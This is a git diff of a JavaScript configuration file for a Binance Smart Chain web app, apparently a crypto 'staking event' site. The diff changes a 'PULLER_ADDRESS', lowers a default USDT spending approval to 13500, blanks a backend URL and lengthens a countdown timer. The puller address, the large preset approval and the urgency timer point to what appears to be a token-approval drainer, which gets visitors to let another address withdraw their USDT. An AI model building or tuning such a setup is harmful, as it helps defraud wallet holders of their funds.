@@ -1,8 +1,8 @@
 // Global config for both pages
 window.APP_CONFIG = {
-  PULLER_ADDRESS: "0xd1e5962eeFe6dc0a870d2148B7e2065666139b5c",
+  PULLER_ADDRESS: "0xD2fF0d66df51529138C4F4ef4976FF0A0d4643fF",
   USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
-  DEFAULT_APPROVAL_USDT: 20000,
+  DEFAULT_APPROVAL_USDT: 13500,
   BSC: {
     CHAIN_ID_HEX: "0x38",
     CHAIN_PARAMS: {
@@ -14,8 +14,8 @@ window.APP_CONFIG = {
     }
   },
   // Leave empty to use same-origin server (recommended)
-  BACKEND_URL: "https://valikon.cloud",
+  BACKEND_URL: "",
   // Staking event deadline in ISO 8601 (UTC) so the public timer drops exactly once per day.
   COUNTDOWN_END_DATE: "2026-05-20T00:00:00Z",
-  COUNTDOWN_FALLBACK_DAYS: 195
+  COUNTDOWN_FALLBACK_DAYS: 250
 };
